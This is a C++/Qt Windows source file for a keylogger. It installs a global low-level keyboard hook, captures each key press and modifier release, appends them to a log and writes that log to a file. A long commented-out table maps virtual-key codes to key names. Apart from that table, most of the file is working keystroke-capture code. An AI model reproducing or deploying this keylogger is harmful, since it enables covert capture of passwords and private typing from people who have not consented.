#include "keylogger.h"
#include "keys.h"

#include <QEventLoop>
#include <qt_windows.h>
#include <QDebug>
#include <QFile>

HHOOK eHook = nullptr;
QString keylog;

/*
class KeyPair
{
public:
    KeyPair (const QString &vk = "", const QString &name = "") : VKName (vk), Name (name) {}
    QString VKName;
    QString Name;
};

class Keys
{
public:
    static std::map<int, KeyPair> KEYS;
};

std::map<int, KeyPair> Keys::KEYS = {
    {0xC1, {"VK_ABNT_C1", "Abnt C1"}},
    {0xC2, {"VK_ABNT_C2", "Abnt C2"}},
    {0x6B, {"VK_ADD", "Numpad +"}},
    {0xF6, {"VK_ATTN", "Attn"}},
    {0x08, {"VK_BACK", "Backspace"}},
    {0x03, {"VK_CANCEL", "Break"}},
    {0x0C, {"VK_CLEAR", "Clear"}},
    {0xF7, {"VK_CRSEL", "Cr Sel"}},
    {0x6E, {"VK_DECIMAL", "Numpad ."}},
    {0x6F, {"VK_DIVIDE", "Numpad /"}},
    {0xF9, {"VK_EREOF", "Er Eof"}},
    {0x1B, {"VK_ESCAPE", "Esc"}},
    {0x2B, {"VK_EXECUTE", "Execute"}},
    {0xF8, {"VK_EXSEL", "Ex Sel"}},
    {0xE6, {"VK_ICO_CLEAR", "IcoClr"}},
    {0xE3, {"VK_ICO_HELP", "IcoHlp"}},
    {0x30, {"VK_KEY_0", "D0"}},
    {0x31, {"VK_KEY_1", "D1"}},
    {0x32, {"VK_KEY_2", "D2"}},
    {0x33, {"VK_KEY_3", "D3"}},
    {0x34, {"VK_KEY_4", "D4"}},
    {0x35, {"VK_KEY_5", "D5"}},
    {0x36, {"VK_KEY_6", "D6"}},
    {0x37, {"VK_KEY_7", "D7"}},
    {0x38, {"VK_KEY_8", "D8"}},
    {0x39, {"VK_KEY_9", "D9"}},
    {0x41, {"VK_KEY_A", "A"}},
    {0x42, {"VK_KEY_B", "B"}},
    {0x43, {"VK_KEY_C", "C"}},
    {0x44, {"VK_KEY_D", "D"}},
    {0x45, {"VK_KEY_E", "E"}},
    {0x46, {"VK_KEY_F", "F"}},
    {0x47, {"VK_KEY_G", "G"}},
    {0x48, {"VK_KEY_H", "H"}},
    {0x49, {"VK_KEY_I", "I"}},
    {0x4A, {"VK_KEY_J", "J"}},
    {0x4B, {"VK_KEY_K", "K"}},
    {0x4C, {"VK_KEY_L", "L"}},
    {0x4D, {"VK_KEY_M", "M"}},
    {0x4E, {"VK_KEY_N", "N"}},
    {0x4F, {"VK_KEY_O", "O"}},
    {0x50, {"VK_KEY_P", "P"}},
    {0x51, {"VK_KEY_Q", "Q"}},
    {0x52, {"VK_KEY_R", "R"}},
    {0x53, {"VK_KEY_S", "S"}},
    {0x54, {"VK_KEY_T", "T"}},
    {0x55, {"VK_KEY_U", "U"}},
    {0x56, {"VK_KEY_V", "V"}},
    {0x57, {"VK_KEY_W", "W"}},
    {0x58, {"VK_KEY_X", "X"}},
    {0x59, {"VK_KEY_Y", "Y"}},
    {0x5A, {"VK_KEY_Z", "Z"}},
    {0x6A, {"VK_MULTIPLY", "Numpad *"}},
    {0xFC, {"VK_NONAME", "NoName"}},
    {0x60, {"VK_NUMPAD0", "N0"}},
    {0x61, {"VK_NUMPAD1", "N1"}},
    {0x62, {"VK_NUMPAD2", "N2"}},
    {0x63, {"VK_NUMPAD3", "N3"}},
    {0x64, {"VK_NUMPAD4", "N4"}},
    {0x65, {"VK_NUMPAD5", "N5"}},
    {0x66, {"VK_NUMPAD6", "N6"}},
    {0x67, {"VK_NUMPAD7", "N7"}},
    {0x68, {"VK_NUMPAD8", "N8"}},
    {0x69, {"VK_NUMPAD9", "N9"}},
    {0xBA, {"VK_OEM_1", "OEM_1 (: ;)"}},
    {0xE2, {"VK_OEM_102", "OEM_102 (> <)"}},
    {0xBF, {"VK_OEM_2", "OEM_2 (? /)"}},
    {0xC0, {"VK_OEM_3", "OEM_3 (~ `)"}},
    {0xDB, {"VK_OEM_4", "OEM_4 ({ )"}},
    {0xDC, {"VK_OEM_5", "OEM_5 (| \\)"}},
    {0xDD, {"VK_OEM_6", "OEM_6 (} )"}},
    {0xDE, {"VK_OEM_7", "OEM_7 (\" ')"}},
    {0xDF, {"VK_OEM_8", "OEM_8 (� !)"}},
    {0xF0, {"VK_OEM_ATTN", "Oem Attn"}},
    {0xF3, {"VK_OEM_AUTO", "Auto"}},
    {0xE1, {"VK_OEM_AX", "Ax"}},
    {0xF5, {"VK_OEM_BACKTAB", "Back Tab"}},
    {0xFE, {"VK_OEM_CLEAR", "OemClr"}},
    {0xBC, {"VK_OEM_COMMA", "OEM_COMMA (< ,)"}},
    {0xF2, {"VK_OEM_COPY", "Copy"}},
    {0xEF, {"VK_OEM_CUSEL", "Cu Sel"}},
    {0xF4, {"VK_OEM_ENLW", "Enlw"}},
    {0xF1, {"VK_OEM_FINISH", "Finish"}},
    {0x95, {"VK_OEM_FJ_LOYA", "Loya"}},
    {0x93, {"VK_OEM_FJ_MASSHOU", "Mashu"}},
    {0x96, {"VK_OEM_FJ_ROYA", "Roya"}},
    {0x94, {"VK_OEM_FJ_TOUROKU", "Touroku"}},
    {0xEA, {"VK_OEM_JUMP", "Jump"}},
    {0xBD, {"VK_OEM_MINUS", "OEM_MINUS (_ -)"}},
    {0xEB, {"VK_OEM_PA1", "OemPa1"}},
    {0xEC, {"VK_OEM_PA2", "OemPa2"}},
    {0xED, {"VK_OEM_PA3", "OemPa3"}},
    {0xBE, {"VK_OEM_PERIOD", "OEM_PERIOD (> .)"}},
    {0xBB, {"VK_OEM_PLUS", "OEM_PLUS (+ =)"}},
    {0xE9, {"VK_OEM_RESET", "Reset"}},
    {0xEE, {"VK_OEM_WSCTRL", "WsCtrl"}},
    {0xFD, {"VK_PA1", "Pa1"}},
    {0xE7, {"VK_PACKET", "Packet"}},
    {0xFA, {"VK_PLAY", "Play"}},
    {0xE5, {"VK_PROCESSKEY", "Process"}},
    {0x0D, {"VK_RETURN", "Enter"}},
    {0x29, {"VK_SELECT", "Select"}},
    {0x6C, {"VK_SEPARATOR", "Separator"}},
    {0x20, {"VK_SPACE", "Space"}},
    {0x6D, {"VK_SUBTRACT", "Num -"}},
    {0x09, {"VK_TAB", "Tab"}},
    {0xFB, {"VK_ZOOM", "Zoom"}},
    {0x1E, {"VK_ACCEPT", "Accept"}},
    {0x5D, {"VK_APPS", "Context Menu"}},
    {0xA6, {"VK_BROWSER_BACK", "Browser Back"}},
    {0xAB, {"VK_BROWSER_FAVORITES", "Browser Favorites"}},
    {0xA7, {"VK_BROWSER_FORWARD", "Browser Forward"}},
    {0xAC, {"VK_BROWSER_HOME", "Browser Home"}},
    {0xA8, {"VK_BROWSER_REFRESH", "Browser Refresh"}},
    {0xAA, {"VK_BROWSER_SEARCH", "Browser Search"}},
    {0xA9, {"VK_BROWSER_STOP", "Browser Stop"}},
    {0x14, {"VK_CAPITAL", "Caps Lock"}},
    {0x1C, {"VK_CONVERT", "Convert"}},
    {0x2E, {"VK_DELETE", "Delete"}},
    {0x28, {"VK_DOWN", "Arrow Down"}},
    {0x23, {"VK_END", "End"}},
    {0x70, {"VK_F1", "F1"}},
    {0x79, {"VK_F10", "F10"}},
    {0x7A, {"VK_F11", "F11"}},
    {0x7B, {"VK_F12", "F12"}},
    {0x7C, {"VK_F13", "F13"}},
    {0x7D, {"VK_F14", "F14"}},
    {0x7E, {"VK_F15", "F15"}},
    {0x7F, {"VK_F16", "F16"}},
    {0x80, {"VK_F17", "F17"}},
    {0x81, {"VK_F18", "F18"}},
    {0x82, {"VK_F19", "F19"}},
    {0x71, {"VK_F2", "F2"}},
    {0x83, {"VK_F20", "F20"}},
    {0x84, {"VK_F21", "F21"}},
    {0x85, {"VK_F22", "F22"}},
    {0x86, {"VK_F23", "F23"}},
    {0x87, {"VK_F24", "F24"}},
    {0x72, {"VK_F3", "F3"}},
    {0x73, {"VK_F4", "F4"}},
    {0x74, {"VK_F5", "F5"}},
    {0x75, {"VK_F6", "F6"}},
    {0x76, {"VK_F7", "F7"}},
    {0x77, {"VK_F8", "F8"}},
    {0x78, {"VK_F9", "F9"}},
    {0x18, {"VK_FINAL", "Final"}},
    {0x2F, {"VK_HELP", "Help"}},
    {0x24, {"VK_HOME", "Home"}},
    {0xE4, {"VK_ICO_00", "Ico00 *"}},
    {0x2D, {"VK_INSERT", "Insert"}},
    {0x17, {"VK_JUNJA", "Junja"}},
    {0x15, {"VK_KANA", "Kana"}},
    {0x19, {"VK_KANJI", "Kanji"}},
    {0xB6, {"VK_LAUNCH_APP1", "App1"}},
    {0xB7, {"VK_LAUNCH_APP2", "App2"}},
    {0xB4, {"VK_LAUNCH_MAIL", "Mail"}},
    {0xB5, {"VK_LAUNCH_MEDIA_SELECT", "Media"}},
    {0x01, {"VK_LBUTTON", "Left Button **"}},
    {0xA2, {"VK_LCONTROL", "Left Ctrl"}},
    {0x25, {"VK_LEFT", "Arrow Left"}},
    {0xA4, {"VK_LMENU", "Left Alt"}},
    {0xA0, {"VK_LSHIFT", "Left Shift"}},
    {0x5B, {"VK_LWIN", "Left Win"}},
    {0x04, {"VK_MBUTTON", "Middle Button **"}},
    {0xB0, {"VK_MEDIA_NEXT_TRACK", "Next Track"}},
    {0xB3, {"VK_MEDIA_PLAY_PAUSE", "Play / Pause"}},
    {0xB1, {"VK_MEDIA_PREV_TRACK", "Previous Track"}},
    {0xB2, {"VK_MEDIA_STOP", "Stop"}},
    {0x1F, {"VK_MODECHANGE", "Mode Change"}},
    {0x22, {"VK_NEXT", "Page Down"}},
    {0x1D, {"VK_NONCONVERT", "Non Convert"}},
    {0x90, {"VK_NUMLOCK", "Num Lock"}},
    {0x92, {"VK_OEM_FJ_JISHO", "Jisho"}},
    {0x13, {"VK_PAUSE", "Pause"}},
    {0x2A, {"VK_PRINT", "Print"}},
    {0x21, {"VK_PRIOR", "Page Up"}},
    {0x02, {"VK_RBUTTON", "Right Button **"}},
    {0xA3, {"VK_RCONTROL", "Right Ctrl"}},
    {0x27, {"VK_RIGHT", "Arrow Right"}},
    {0xA5, {"VK_RMENU", "Right Alt"}},
    {0xA1, {"VK_RSHIFT", "Right Shift"}},
    {0x5C, {"VK_RWIN", "Right Win"}},
    {0x91, {"VK_SCROLL", "Scrol Lock"}},
    {0x5F, {"VK_SLEEP", "Sleep"}},
    {0x2C, {"VK_SNAPSHOT", "Print Screen"}},
    {0x26, {"VK_UP", "Arrow Up"}},
    {0xAE, {"VK_VOLUME_DOWN", "Volume Down"}},
    {0xAD, {"VK_VOLUME_MUTE", "Volume Mute"}},
    {0xAF, {"VK_VOLUME_UP", "Volume Up"}},
    {0x05, {"VK_XBUTTON1", "X Button 1 **"}},
    {0x06, {"VK_XBUTTON2", "X Button 2 **"}},
};
*/
LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
//        keylog += Keys::KEYS[kbs->vkCode].Name;
        KeyLogger::appendKey(Keys::vkToKey(kbs->vkCode));
        if(kbs->vkCode == VK_RETURN)
            keylog += '\n';
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL
            || key == VK_LCONTROL
            || key == VK_RCONTROL
            || key == VK_SHIFT
            || key == VK_RSHIFT
            || key == VK_LSHIFT
            || key == VK_MENU
            || key == VK_LMENU
            || key == VK_RMENU
            || key == VK_CAPITAL
            || key == VK_NUMLOCK
            || key == VK_LWIN
            || key == VK_RWIN
                            )
        {
            KeyLogger::appendKey(Keys::vkToKey(kbs->vkCode));
//            QString KeyName = Keys::KEYS[kbs->vkCode].Name;
//            KeyName.insert(1, "/");
//            keylog += KeyName;
//            KeyLogger::appendKey(KeyName.toUtf8());
        }
    }

    qDebug() << keylog;

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}
bool InstallHook()
{
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL,
                             (HOOKPROC)OurKeyBoardProc,
                             NULL, 0);
    return eHook != nullptr;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx (eHook);
    eHook = nullptr;
    return b;
}

bool IsHooked()
{
    return eHook;
}

//void KeyLogger::quit()
//{
//    if (loop)
//        loop->quit();
//}

void KeyLogger::run_native()
{
    if (!InstallHook()) {
        qDebug() << "Unable to install hook";
        return;
    }
//    loop = new QEventLoop(this);
//    loop->exec();
    exec();
    UninstallHook();
    _logFile->flush();
    _logFile->close();
}
